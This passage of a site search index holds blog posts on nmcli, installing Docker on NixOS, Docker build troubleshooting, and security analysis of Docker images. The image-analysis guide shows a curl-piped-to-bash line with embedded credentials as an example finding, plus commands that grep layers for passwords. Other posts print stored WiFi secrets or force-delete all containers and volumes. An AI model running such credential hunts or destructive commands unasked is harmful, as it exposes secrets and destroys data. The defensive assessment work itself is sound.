connection nmcli connection delete \u0026#34;connection_name\u0026#34; # Modify connection properties nmcli connection modify \u0026#34;connection_name\u0026#34; ipv4.addresses \u0026#34;192.168.1.100/24\u0026#34; nmcli connection modify \u0026#34;connection_name\u0026#34; ipv4.gateway \u0026#34;192.168.1.1\u0026#34; nmcli connection modify \u0026#34;connection_name\u0026#34; ipv4.dns \u0026#34;8.8.8.8\u0026#34; Advanced Operations: Creating New Connections: # Create a new WiFi connection nmcli connection add type wifi con-name \u0026#34;MyWiFi\u0026#34; ifname wlan0 ssid \u0026#34;NetworkName\u0026#34; # Create a static IP connection nmcli connection add type ethernet con-name \u0026#34;Static\u0026#34; ifname eth0 \\ ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 \\ ipv4.dns \u0026#34;8.8.8.8,8.8.4.4\u0026#34; ipv4.method manual Troubleshooting: # Restart a connection nmcli connection down \u0026#34;connection_name\u0026#34; nmcli connection up \u0026#34;connection_name\u0026#34; # Reset all network settings nmcli networking off nmcli networking on # Show detailed device information nmcli device show # Monitor network changes nmcli monitor Security Operations: # Show stored WiFi passwords nmcli -show-secrets connection show \u0026#34;connection_name\u0026#34; # Change WiFi password nmcli connection modify \u0026#34;connection_name\u0026#34; wifi-sec.psk \u0026#34;new_password\u0026#34; Common Error Messages # Error: \u0026#34;Device not found\u0026#34; # Solution: Check if the device exists and is recognized nmcli device status ip link show # Error: \u0026#34;Connection activation failed: (7) Secrets were required, but not provided\u0026#34; # Solution: Ensure the password is correct and properly quoted nmcli device wifi connect \u0026#34;SSID\u0026#34; password \u0026#34;correct_password\u0026#34; # Error: \u0026#34;Connection activation failed: (2) Active connection removed before it was initialized\u0026#34; # Solution: Often indicates driver issues. Try reloading the WiFi driver: sudo modprobe -r wifi_driver_name # Replace with your actual driver sudo modprobe wifi_driver_name Tips Use tab completion with nmcli for easier command typing Connection names are case-sensitive Use quotes around SSIDs or connection names that contain spaces (you can escape using \\ e.g Super\\ Secure\\ SSID) Most system-wide network changes require root privileges (sudo) Always backup your network configuration before making significant changes Use nmcli monitor to troubleshoot connection issues in real-time ", 
        "url": "http:\/\/localhost:1313\/cheatsheets\/networkmanagercli\/"
    },
    
    "http:\/\/localhost:1313\/tags\/networking\/": {
        "title": "Networking",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/networking\/"
    },
    
    "http:\/\/localhost:1313\/tags\/reference\/": {
        "title": "Reference",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/reference\/"
    },
    
    "http:\/\/localhost:1313\/tags\/sysadmin\/": {
        "title": "Sysadmin",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/sysadmin\/"
    },
    
    "http:\/\/localhost:1313\/tags\/tools\/": {
        "title": "Tools",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/tools\/"
    },
    
    "http:\/\/localhost:1313\/tags\/configuration\/": {
        "title": "Configuration",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/configuration\/"
    },
    
    "http:\/\/localhost:1313\/tags\/docker\/": {
        "title": "Docker",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/docker\/"
    },
    
    "http:\/\/localhost:1313\/tags\/homelab\/": {
        "title": "Homelab",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/homelab\/"
    },
    
    "http:\/\/localhost:1313\/homelab\/": {
        "title": "Homelabs",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/homelab\/"
    },
    
    "http:\/\/localhost:1313\/tags\/nixos\/": {
        "title": "Nixos",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/nixos\/"
    },
    
    "http:\/\/localhost:1313\/homelab\/202503120622-nixos-homelab-5\/": {
        "title": "Rebuilding My Homelab In NixOS (Part 5) Installing Docker \u0026 other tools on NixOS",
        "tags": ["docker","nixos","homelab","system","configuration",],
        "content": "This is part 5 of my series demonstrating my rebuild of my homelab in NixOS.\nInitial creation of the NixOSVM on Proxmox Part 1 . Enabling SSH access on NixOS Part 2 . Mounting a secondary drive on NixOS Part 3 . Decrypting boot early with initrd-ssh Part 4 . Installing Docker on NixOS Part 5 (This part) Overview: So far in this series we have setup the following:\nA NixOS VM running on Proxmox. SSH access to the VM. A secondary drive mounted on the VM. SSH access in early boot via initrd-ssh. Which is great, but we are still missing a few things, namely Docker and other tools which will make this homelab complete. We will cover that in this article.\nInstalling Packages: NixOS has a very easy way to packages. Again we are going to open configuration.nix file and add the following lines.\nFinding Packages In our configuration.nix you can find a section that looks like the below\nThis is where we can easily add programs we want to install.\nUsing search.nixos.org to search for packages: You can see at the top it says we can actually search for packages, by running nix search [package] however this only works if we activate experimental features which is out of scope for this article, instead we can use https://search.nixos.org/packages to search for packages.\nInstalling systemPackages in NixOS: Step 1: Add the packages to configuration.nix: So lets install some packages, I am going to install the below packages, vim, acl, wget, git nfs-utils \u0026amp; rsync, as you can see it\u0026rsquo;s as simple as just adding the package name.\nYou may have also notices that these are listed under systemPackages, this means these will be available system-wide. It is possible to install packages on a per user basis \u0026amp; use things like home-manager, but again that is out of scope for this article. See Additional Note On Security: # List packages installed in system profile. To search, run: # $ nix search wget environment.systemPackages = with pkgs; [ vim # Do not forget to add an editor to edit configuration.nix! The Nano editor is also installed by default. acl wget git nfs-utils rsync ]; +Note+: Not all of these are required for this tutorial, however in later tutorials we will be mounting external nfs shares for docker to access and this will require modifying acls, also if you plan to version to control this or pull any external git repo\u0026rsquo;s down I would also advise installing git Additional Note On Security:\nI did consider installing these under user packages but elected not to for the following reasons:\nThe security benefit is minimal for these particular utilities since they\u0026rsquo;re common tools that don\u0026rsquo;t introduce significant attack surface by themselves.\nFor vim, wget, git, and rsync, there\u0026rsquo;s minimal security difference between user and system installation.* For nfs-utils, system-wide installation is beneficial since it typically involves system services that run as root anyway. +Note+: Please note I did not say there is \u0026ldquo;no security differences\u0026rdquo;, there are minimal.\nStep 2: Rebuild the system to install the packages: Now that we have updated configuration.nix we now need to rebuild the system for our changes to be made.\nsudo nixos-rebuild switch Installing Docker on NixOS Preamble: What is Docker and Why Use It? If you\u0026rsquo;re installing NixOS there is a good chance you already know what docker is, but for those who don\u0026rsquo;t here is a brief overview\nDocker is a platform that allows you to package and run applications in isolated environments called containers. Think of containers like lightweight, standalone packages that contain(see what I did there) everything needed to run a piece of software - the code, runtime, system tools, and settings. These run on top of the existing linux kernel in layers.\nFor a homelab, Docker is particularly valuable because it allows us to do the following.\nMakes it easy to deploy applications without worrying about dependencies (everything is contained in the container) Keeps different applications isolated from each other (unless we want them to talk to each other) Allows us to easily update and manage services (we can update a single container, pin it to a specific version or just leave as is) Provides a consistent environment across different machines (theoretically if I give you same docker configuration I have compose.yml it should be the exact same on your machine) Makes backing up and moving applications between systems simpler (we can set persistent storage\u0026hellip;remember that secondary drive we setup earlier?) For a homelab, Docker will likely become one of your most-used tools for running services like media servers, monitoring tools, or web applications.\nStep 1: Basic Docker Installation Option A: Default Installation If you do not plan to use the secondary drive and are happy with the default location for docker, which is usually /var/lib/docker you can put the below in your config and run nixos-rebuild switch.\n# Enable Docker virtualisation.docker = { enable = true; }; }; Option B: Custom Data Directory Configuration You might want to change Docker\u0026rsquo;s default data directory location for several reasons:\nBetter storage management: Keeping Docker data on a separate drive helps prevent your system drive from filling up Performance: A dedicated drive (especially SSDs) can improve container performance Easier backups: Having Docker data on a separate drive makes it simpler to backup and restore your containers Space constraints: System drives often have limited space compared to secondary storage If you plan on using the secondary drive, NixOS makes it easy to change where Docker stores its data. We just need to add the following information to our configuration.nix docker section:\n# Enable Docker virtualisation.docker = { enable = true; daemon.settings = { \u0026#34;data-root\u0026#34; = \u0026#34;/mnt/docker\u0026#34;; }; }; This configuration will store all Docker-related data including:\nImages Containers Volumes Build cache Network configurations This is one of the many reasons I love NixOS, the simplicity of the configuration.nix file is amazing, it is so easy to understand and modify. (don\u0026rsquo;t get me wrong there are some things that are a bit tricky and that I still don\u0026rsquo;t understand, but overall it is a very easy to understand and modify system).\nStep 2: Apply Docker Configuration sudo nixos-rebuild switch Step 3: Handling Docker Permissions Understanding Docker Permission Errors If you try and run any docker commands right now they will fail with the below error, there are 3 ways around this error:\nThere are 3 ways around this error: Run every docker command with sudo: Reason why we are not doing it: Running Docker commands with sudo gives those commands full root access to your system. This is dangerous because: A misconfigured container could gain access to your entire system Any security vulnerabilities in Docker could be exploited with root privileges Command history might expose sudo commands that could be misused Install docker rootless on NixOS: I have never managed to get this to run successfully whilst exposing restricted ports. Add our user to the docker group: This is the best solution for this specific use case so lets do that. While this still grants significant privileges, it\u0026rsquo;s more controlled than using sudo and follows Docker\u0026rsquo;s recommended practice for non-production environments. +Note+: I am aware there are other ways to run docker containers within NixOS, declarativley as well as using other tools, however for these tutorials this is my preferred approach.\nAdding User to Docker Group Again we will be making changes to our configuration.nix file, in it you will find a section that looks like the below:\nYou can see that groups are added via the extraGroups list. So we just need to add \u0026quot;docker\u0026quot; to this.\n# Define a user account. Don\u0026#39;t forget to set a password with \u0026#39;passwd\u0026#39;. users.users.martin = { isNormalUser = true; description = \u0026#34;martin\u0026#34;; extraGroups = [ \u0026#34;networkmanager\u0026#34; \u0026#34;wheel\u0026#34; \u0026#34;docker\u0026#34; ]; packages = with pkgs; []; }; +Note+: You may have also noticed that we can add user packages here but for this tutorial we don\u0026rsquo;t need to. Nerdy Nix List Fact: Nix has lists as a fundamental data structure, but +doesn\u0026rsquo;t+ have a distinct \u0026ldquo;array\u0026rdquo; type as found in some other programming languages. So if you see the square bracket notation [ ... ] in Nix, it\u0026rsquo;s always referring to a list.\nLists in Nix are immutable sequences of values that can contain elements of different types. The terminology distinction matters because Nix\u0026rsquo;s type system is quite specific - it has lists, sets (attribute sets), and other primitive types, but not \u0026ldquo;arrays\u0026rdquo; in the traditional programming sense.\nStep 4: Apply User Changes sudo nixos-rebuild switch Step 5: Verify Installation Activate Group Changes If we try and run docker commands it still wont\u0026rsquo; work as the new changes are not reflected in the current shell, the easiest way to verify this is working is to logout and back in, once done you should be able to run docker commands.\nTest Docker Installation Lets run hello-world to verify it\u0026rsquo;s all working.\ndocker run hello-world As we can see it\u0026rsquo;s working as expected.\nConclusion/Next Time: You now have a system that has docker installed, in the next post we will actually create our docker compose file.\nSign-off: As always hack the planet homelab!\n", 
        "url": "http:\/\/localhost:1313\/homelab\/202503120622-nixos-homelab-5\/"
    },
    
    "http:\/\/localhost:1313\/tags\/system\/": {
        "title": "System",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/system\/"
    },
    
    "http:\/\/localhost:1313\/cheatsheets\/commondockerbuildissues\/": {
        "title": "Common Docker Build Issues: A Comprehensive Troubleshooting Guide",
        "tags": ["docker","containers","devops","containerization","troubleshooting","debugging","optimization","security",],
        "content": "Troubleshooting Common Docker Build Issues: A Comprehensive Guide Introduction Docker has revolutionized how we package and deploy applications, but the build process can sometimes be challenging, with obtuse errors and lots of troubleshooting, I\u0026rsquo;m looking at you GO dependencies. This guide will help you identify, understand, and resolve common Docker build issues.\nCommon Docker Build Issues and Solutions 1. Base Image Issues Problem: Unavailable or Incorrect Base Images\nWhen building a Docker image, you need to start with a base image (specified by the FROM instruction). Sometimes the build fails because the base image doesn\u0026rsquo;t exist, can\u0026rsquo;t be found, or you\u0026rsquo;ve made a typo in the image name. This is like trying to build a house on a foundation that isn\u0026rsquo;t there - it\u0026rsquo;s impossible to proceed without a valid base image.\nExample of a failing Dockerfile:\nFROM nonexistent:latest # Rest of Dockerfile Solutions:\nVerify the base image name and tag Check if the image exists on Docker Hub or your private registry Ensure proper authentication for private registries Consider using official images or well-maintained alternatives Practical Implementation:\n# Check if image exists locally docker images | grep ubuntu # Pull and verify specific version docker pull ubuntu:22.04 docker image inspect ubuntu:22.04 # Search Docker Hub docker search ubuntu # Configure private registry docker login registry.example.com 2. Dependency Resolution Problems Problem: Missing or Failed Package Installation\nOne of the most common issues when building Docker images is failing to install packages or dependencies correctly. This usually happens because the package manager\u0026rsquo;s database isn\u0026rsquo;t updated before trying to install packages, or because you\u0026rsquo;re trying to install packages that don\u0026rsquo;t exist. It\u0026rsquo;s similar to trying to shop at a store using an outdated catalog - you need to update your list of available items first.\nExample of a failing installation:\nFROM ubuntu:22.04 RUN apt-get install python3 # This will fail because apt database isn\u0026#39;t updated Solution:\nAlways update package managers before installing \u0026amp; combine run commands to reduce the amount of layers.\nFROM ubuntu:22.04 RUN apt-get update \u0026amp;\u0026amp; apt-get install -y \\ python3 \\ \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* Best Practices:\nAlways update package managers before installing Combine RUN commands to reduce layers Clean up package manager caches Use version pinning for stability Practical Implementation:\n# Good practice - combining updates and cleanup FROM ubuntu:22.04 # Set noninteractive installation ENV DEBIAN_FRONTEND=noninteractive # Combine commands and cleanup in single layer RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y \\ python3 \\ python3-pip \\ \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* \\ \u0026amp;\u0026amp; apt-get clean # Pin specific versions RUN pip3 install requests==2.28.1 3. Build Context and Cache Issues Problem: Slow Builds or Unexpected Caching\nDocker builds can become painfully slow or behave unexpectedly due to large build contexts (all the files Docker needs to copy into the image) or cache-related issues. Think of it like trying to send a huge email attachment when you only need a small file - the unnecessary files slow down the process. Additionally, Docker\u0026rsquo;s caching mechanism, while usually helpful, can sometimes use outdated cached layers when you actually need fresh ones.\nSolutions:\nUse .dockerignore to exclude unnecessary files Organize Dockerfile commands from least to most frequently changing Use multi-stage builds for complex applications Clear cache when needed: docker build --no-cache Practical Implementation:\n# Create .dockerignore cat \u0026gt; .dockerignore \u0026lt;\u0026lt;EOF .git .env *.log node_modules __pycache__ *.pyc EOF # Check build context size docker build --no-cache . 2\u0026gt;\u0026amp;1 | grep \u0026#34;Sending build context\u0026#34; # Use specific build context docker build -f Dockerfile -t myapp:latest subdir/ 4. Permission and Ownership Issues Problem: Access Denied Errors\nPermission issues occur when Docker can\u0026rsquo;t access files it needs to copy into the image, or when processes inside the container don\u0026rsquo;t have the right permissions to access files or directories. This is similar to being locked out of a room because you don\u0026rsquo;t have the right key. These issues are especially common when working with mounted volumes or when trying to run applications as non-root users.\nSolutions:\nSet appropriate permissions before COPY Use --chown flag with COPY/ADD Consider creating and using non-root users Practical Implementation:\n# Create non-root user and set permissions properly FROM ubuntu:22.04 # Create user and group RUN groupadd -r appgroup \u0026amp;\u0026amp; useradd -r -g appgroup appuser # Set ownership during COPY COPY --chown=appuser:appgroup ./app /app # Set permissions RUN chmod 755 /app/script.sh # Switch to non-root user USER appuser CMD [\u0026#34;/app/script.sh\u0026#34;] 5. Resource Constraints Problem: Build Failures Due to Resource Exhaustion\nSometimes Docker builds fail because your system runs out of resources - memory, CPU, or disk space. This is like trying to cook in a kitchen that\u0026rsquo;s too small or with a stove that\u0026rsquo;s not powerful enough. Large builds, especially those involving compilation or processing of big datasets, can consume significant resources. When Docker runs out of resources, it may fail abruptly or become extremely slow.\nSolutions:\nIncrease Docker resource limits Optimize build steps to reduce resource usage Implement multi-stage builds to reduce final image size Clean up unused images and containers regularly Practical Implementation:\n# Set resource limits during build docker build --memory=2g --cpu-quota=150000 -t myapp . # Clean up system resources docker system prune -af --volumes # Configure buildkit resource limits export BUILDKIT_STEP_MEMORY_LIMIT=2g export BUILDKIT_STEP_TIMEOUT=3600 6. Network-Related Build Issues Problem: Network Connection Failures\nNetwork issues can prevent Docker from downloading necessary components during the build process. This commonly happens in corporate environments with proxies, when DNS resolution fails, or when you hit rate limits from package repositories. It\u0026rsquo;s similar to trying to download a file with a poor internet connection - the process fails because Docker can\u0026rsquo;t reach the resources it needs.\nSolutions:\nConfigure Docker to use proper proxy settings # In /etc/docker/daemon.json { \u0026#34;dns\u0026#34;: [\u0026#34;8.8.8.8\u0026#34;, \u0026#34;8.8.4.4\u0026#34;], \u0026#34;http-proxy\u0026#34;: \u0026#34;http://proxy.example.com:80\u0026#34;, \u0026#34;https-proxy\u0026#34;: \u0026#34;https://proxy.example.com:443\u0026#34;, \u0026#34;no-proxy\u0026#34;: \u0026#34;localhost,127.0.0.1\u0026#34; } Use build arguments for flexible proxy configuration ARG HTTP_PROXY ARG HTTPS_PROXY ENV http_proxy=$HTTP_PROXY ENV https_proxy=$HTTPS_PROXY RUN apt-get update \u0026amp;\u0026amp; apt-get install -y ... Practical Implementation:\n# Configure system-wide proxy cat \u0026gt; /etc/systemd/system/docker.service.d/http-proxy.conf \u0026lt;\u0026lt;EOF [Service] Environment=\u0026#34;HTTP_PROXY=http://proxy.example.com:80\u0026#34; Environment=\u0026#34;HTTPS_PROXY=https://proxy.example.com:443\u0026#34; Environment=\u0026#34;NO_PROXY=localhost,127.0.0.1\u0026#34; EOF systemctl daemon-reload systemctl restart docker # In Dockerfile FROM ubuntu:22.04 ARG HTTP_PROXY ARG HTTPS_PROXY ENV http_proxy=$HTTP_PROXY ENV https_proxy=$HTTPS_PROXY RUN apt-get update \u0026amp;\u0026amp; apt-get install -y ... Troubleshooting Checklist The troubleshooting checklist is your first line of defense when Docker builds fail. Like a pilot\u0026rsquo;s pre-flight checklist, going through these items systematically helps catch common issues before they become bigger problems. Let\u0026rsquo;s look at each area we need to verify.\nBuild Environment Before diving into specific issues, it\u0026rsquo;s important to verify your basic build environment. Think of this like checking if you have all your tools and workspace ready before starting a project. A proper build environment needs adequate resources, a running Docker daemon, and network connectivity to download necessary components.\nSufficient disk space # Check available space df -h /var/lib/docker # Check Docker disk usage docker system df # Clean up if needed docker system prune -af --volumes Adequate memory and CPU # Check system resources free -h # View CPU info nproc lscpu # Monitor Docker resource usage docker stats Docker daemon running # Check daemon status systemctl status docker # Start if not running sudo systemctl start docker # Enable on boot sudo systemctl enable docker Network connectivity # Test Docker Hub connectivity ping -c 3 registry.hub.docker.com # Test Docker registry API curl -v https://registry.hub.docker.com/v2/ # Check DNS resolution dig registry.hub.docker.com # Test docker pull docker pull hello-world Practical Implementation:\n# Check disk space df -h /var/lib/docker # Check Docker system resources docker system df -v # Verify Docker daemon status systemctl status docker # Test network connectivity ping -c 3 registry.hub.docker.com curl -v https://registry.hub.docker.com/v2/ Dockerfile Validation Dockerfile validation is like proofreading your recipe before cooking - it helps catch basic mistakes before they cause problems. This includes checking for syntax errors, making sure your base image exists, and verifying that your commands are in a logical order. Many build failures can be prevented by validating your Dockerfile before running the build.\nSyntax correctness Base image availability Command ordering Layer optimization Practical Implementation:\n# Test base image pull docker pull mybase:latest # Analyze layers docker history myimage:latest # Lint Dockerfile using hadolint (install first) docker run --rm -i hadolint/hadolint \u0026lt; Dockerfile Example of hadolint output giving us warnings.\nYou can also use VS Code etc which have good dockerfile linters. Dependencies Managing dependencies is like ensuring you have all the ingredients before starting to cook. Your application needs various packages and libraries to run, and these need to be properly specified and installed. Common issues include missing packages, version conflicts, and network problems when trying to download dependencies.\nPackage manager updates Correct package names Version compatibility Network access to repositories Practical Implementation:\n# Example of proper dependency management FROM ubuntu:22.04 # Pin versions explicitly RUN apt-get update \u0026amp;\u0026amp; apt-get install -y \\ python3=3.10.* \\ python3-pip=22.0.* \\ \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* # Use requirements.txt with fixed versions COPY requirements.txt . RUN pip3 install -r requirements.txt Permissions Permission issues in Docker are like having the right key but not the right access level. This section helps you understand how to properly set up file ownership and access rights, both inside the container and for mounted volumes. Getting permissions wrong can lead to applications failing to start or access necessary files.\nFile ownership Directory permissions User context Volume mounts Practical Implementation:\n# Check and fix host permissions chmod -R 755 ./app chown -R 1000:1000 ./app # Verify volume permissions docker run --rm -v $(pwd)/app:/app busybox ls -la /app Debug Commands and Tools When things go wrong, having the right debugging tools is essential. This section covers various commands and techniques for investigating build failures, inspecting images, and troubleshooting running containers. Think of these as your diagnostic tools - like a mechanic\u0026rsquo;s toolkit for Docker containers.\nAdditional Debugging Examples:\n# Debug layer by layer docker build --no-cache . # Export container filesystem for inspection docker export mycontainer \u0026gt; container.tar # Inspect build cache docker builder prune --filter until=24h # Check build logs with timestamp docker build --no-cache . 2\u0026gt;\u0026amp;1 | while read line; do echo \u0026#34;[$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;)] $line\u0026#34;; done The last option will prepend the build output with timestamps. +Example Output Below+ martin in ~/Desktop/build 13GiB/31GiB | 445MiB/34GiB on ☁️ (eu-west-2) with /usr/bin/zsh 🕙 17:55:51 zsh ❯ docker build --no-cache . 2\u0026gt;\u0026amp;1 | while read line; do echo \u0026#34;[$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;)] $line\u0026#34;; done [2025-03-11 17:56:18] DEPRECATED: The legacy builder is deprecated and will be removed in a future release. [2025-03-11 17:56:18] Install the buildx component to build images with BuildKit: [2025-03-11 17:56:18] https://docs.docker.com/go/buildx/ [2025-03-11 17:56:18] [2025-03-11 17:56:18] Sending build context to Docker daemon 2.56kB [2025-03-11 17:56:18] Step 1/5 : FROM ubuntu:24.04 [2025-03-11 17:56:18] ---\u0026gt; a04dc4851cbc [2025-03-11 17:56:18] Step 2/5 : RUN sed -i \u0026#39;s/# (.*multiverse$)/1/g\u0026#39; /etc/apt/sources.list \u0026amp;\u0026amp; apt-get update \u0026amp;\u0026amp; apt-get -y upgrade \u0026amp;\u0026amp; apt-get install -y build-essential \u0026amp;\u0026amp; apt-get install -y software-properties-common \u0026amp;\u0026amp; apt-get install -y byobu curl git htop man unzip vim wget \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* [2025-03-11 17:56:18] ---\u0026gt; Running in 36c592ab27f1 [2025-03-11 17:56:23] Get:1 http://archive.ubuntu.com/ubuntu noble InRelease [256 kB] [2025-03-11 17:56:23] Get:2 http://security.ubuntu.com/ubuntu noble-security InRelease [126 kB] [2025-03-11 17:56:23] Get:3 http://archive.ubuntu.com/ubuntu noble-updates InRelease [126 kB] [2025-03-11 17:56:23] Get:4 http://security.ubuntu.com/ubuntu noble-security/multiverse amd64 Packages [34.0 kB] [2025-03-11 17:56:23] Get:5 http://archive.ubuntu.com/ubuntu noble-backports InRelease [126 kB] Security Considerations During Builds Scanning for Vulnerabilities Security scanning is like having a security guard check your building for weaknesses. Container images can contain vulnerabilities in their packages or configurations that could be exploited. Regular scanning helps identify and fix these security issues before they become problems in production.\nBest Practices Security best practices are your guidelines for building secure containers. Just like you wouldn\u0026rsquo;t leave your house with all the windows open, you shouldn\u0026rsquo;t build containers without following security principles. This includes minimizing installed packages, using specific versions, and following the principle of least privilege.\nPractical Implementation:\n# Using Trivy scanner trivy image myimage:latest # Check for sensitive data in layers docker history --no-trunc myimage:latest # Audit image content docker run --rm -it myimage:latest find / -perm -4000 2\u0026gt;/dev/null Practical Implementation:\n# Example of secure Dockerfile practices FROM ubuntu:22.04 AS builder # Add specific user RUN groupadd -r appuser \u0026amp;\u0026amp; useradd -r -g appuser appuser # Pin versions and minimize layers RUN apt-get update \u0026amp;\u0026amp; apt-get install -y \\ python3=3.10.* \\ \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* # Use multi-stage to reduce attack surface FROM gcr.io/distroless/python3 COPY --from=builder /app /app USER nonroot ENTRYPOINT [\u0026#34;python3\u0026#34;, \u0026#34;/app/main.py\u0026#34;] Build Performance Optimization Layer Optimization Layer optimization is like organizing your workspace efficiently. Each layer in a Docker image adds to the final size and build time. By organizing your layers smartly and combining related commands, you can make your builds faster and your images smaller.\nPractical Implementation:\n# Example of optimized layer caching FROM node:16-slim # Cache dependencies layer COPY package*.json ./ RUN npm ci # Cache build layer COPY tsconfig.json ./ COPY src/ src/ RUN npm run build # Runtime layer FROM node:16-slim COPY --from=0 /app/dist ./dist COPY package*.json ./ RUN npm ci --only=production CMD [\u0026#34;node\u0026#34;, \u0026#34;dist/main.js\u0026#34;] BuildKit Features BuildKit is Docker\u0026rsquo;s advanced building toolkit, offering features like better caching, parallel building, and secure secret handling. It\u0026rsquo;s like having a more sophisticated set of tools that can make your builds faster and more secure. Understanding these features can significantly improve your Docker build experience.\nPractical Implementation:\n# syntax=docker/dockerfile:1.4 FROM ubuntu:22.04 RUN --mount=type=cache,target=/var/cache/apt \\ apt-get update \u0026amp;\u0026amp; apt-get install -y python3 Additional BuildKit Examples:\n# syntax=docker/dockerfile:1.4 FROM ubuntu:22.04 # Mount cache for apt RUN --mount=type=cache,target=/var/cache/apt \\ --mount=type=cache,target=/var/lib/apt \\ apt-get update \u0026amp;\u0026amp; apt-get install -y python3 # Mount secrets RUN --mount=type=secret,id=mysecret,target=/secret.txt \\ cat /secret.txt \u0026gt; /app/config # Mount SSH for private repos RUN --mount=type=ssh git clone git@github.com:org/repo.git ", 
        "url": "http:\/\/localhost:1313\/cheatsheets\/commondockerbuildissues\/"
    },
    
    "http:\/\/localhost:1313\/tags\/containerization\/": {
        "title": "Containerization",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/containerization\/"
    },
    
    "http:\/\/localhost:1313\/tags\/containers\/": {
        "title": "Containers",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/containers\/"
    },
    
    "http:\/\/localhost:1313\/tags\/debugging\/": {
        "title": "Debugging",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/debugging\/"
    },
    
    "http:\/\/localhost:1313\/tags\/devops\/": {
        "title": "Devops",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/devops\/"
    },
    
    "http:\/\/localhost:1313\/cheatsheets\/dockerimagesecurityanalysis\/": {
        "title": "Docker Image Security Analysis and Testing",
        "tags": ["docker","containers","pentesting","security","devops","containerization","redteam",],
        "content": "Docker Image Security Analysis and Testing When performing security assessments of Docker containers, having local access to container images provides significant advantages. This guide focuses on the security analysis and testing aspects of Docker containers, showing you how to perform thorough security assessments of container images.\nWhy Perform Local Security Analysis? Comprehensive security testing\nLocal access enables thorough security testing without network constraints or external dependencies. This is crucial when performing detailed vulnerability assessments or penetration testing of container images. Forensic analysis capabilities\nHaving the container image locally allows for in-depth forensic analysis of container layers, installed packages, configurations, and potential embedded secrets. Isolated testing environment\nLocal testing environments allow you to modify and test images without affecting production systems, crucial for security assessments where modifications might trigger security alerts. Detailed vulnerability scanning\nLocal access means you can perform comprehensive vulnerability scanning without being subject to rate limiting from registries or API endpoints. Setting Up a Secure Testing Environment 1. Create Isolated Network # Create dedicated docker network for testing docker network create --internal pentest-network This creates an internal network that has no external access, providing isolation for your testing environment.\n2. Basic Container Analysis Setup # Run with security analysis tools mounted docker run -it \\ --name analysis-container \\ --network pentest-network \\ -v /path/to/tools:/tools \\ --cap-add=SYS_PTRACE \\ target_image:tag 3. Common Analysis Options Option Purpose \u0026ndash;cap-add=SYS_PTRACE Enable debugging capabilities \u0026ndash;security-opt seccomp=unconfined Disable security profiles for testing -v $(pwd)/results:/results Mount directory for findings \u0026ndash;network none Complete network isolation Forensic Analysis Techniques Layer Analysis Extract filesystem layers for detailed examination:\n# Extract image layers mkdir image-analysis cd image-analysis docker save image_name:tag | tar -xv This command sequence allows you to dig deep into the internals of a Docker image. Here\u0026rsquo;s what\u0026rsquo;s happening:\nFirst, docker save exports the entire image as a tar archive The pipe (|) feeds this directly into tar -xv which extracts all layers Each layer contains a full filesystem snapshot at that build stage After extraction, you\u0026rsquo;ll find a /blobs directory which contains:\nFilesystem changes for each layer Binary and text files added during image building Modified configuration files Application code and dependencies System libraries and executables Analyzing Layer Contents Each blob in /blobs/sha256/ is a tar archive that can be analyzed:\n# Navigate to the blob directory cd blobs/sha256/ # Extract contents of a specific layer mkdir layer_contents tar xf \u0026lt;blob-hash\u0026gt; -C ./layer_contents # Search for specific file types tar tvf \u0026lt;blob-hash\u0026gt; | grep \u0026#34;\\.conf$\u0026#34; # Search for sensitive information tar xf \u0026lt;blob-hash\u0026gt; --to-stdout | strings | grep -ie \u0026#34;password\\|user\\|cred\u0026#34; # Extract and analyze specific files tar xf \u0026lt;blob-hash\u0026gt; layer/etc/passwd --to-stdout | grep -ie \u0026#34;root\u0026#34; Pro Tips:\nFor binary files, always extract first, then analyze The --to-stdout option is more reliable than -O for text extraction Use strings command selectively as it might miss encoded/compressed data Security Assessment Techniques 1. Image History Analysis The docker history command is a powerful tool for security analysis:\n# Get complete build history docker history --no-trunc image_name:tag # Export for later analysis docker history --no-trunc image_name:tag \u0026gt; imageHistory.txt # Search for sensitive information docker history --no-trunc image_name:tag | grep -ie \u0026#34;pass\\|user\\|cred\u0026#34; This can reveal sensitive information such as:\nEnvironment variables containing credentials Installation commands with version numbers Temporary files or credentials in earlier layers Internal URLs and repository information Usernames and working directories For example, you might find exposed credentials in the history:\nRUN curl -u admin:SuperSecret123 http://internal-repo.company.local/setup.sh | bash 2. Configuration Analysis # Export container configuration docker inspect image_name:tag \u0026gt; container_config.json # Check for sensitive mounts or environment variables jq \u0026#39;.Config.Env, .HostConfig.Binds\u0026#39; container_config.json 3. Package and Dependency Analysis # List installed packages docker run --rm image_name:tag dpkg -l # For Debian-based docker run --rm image_name:tag rpm -qa # For RPM-based # Check for known vulnerabilities docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image_name:tag Documentation and Reporting Maintain detailed documentation of your findings:\n# Document original image state docker inspect image_name:tag \u0026gt; original_image_info.json docker history image_name:tag \u0026gt; image_history.txt # Document running processes and open ports docker top container_name docker port container_name Cleanup Procedures Always clean up after security testing:\n# Remove all test containers docker rm -f $(docker ps -aq) # Remove test images docker rmi -f target_image:tag # Remove test network docker network rm pentest-network # Securely delete sensitive files shred -u target_image.tar rm -rf 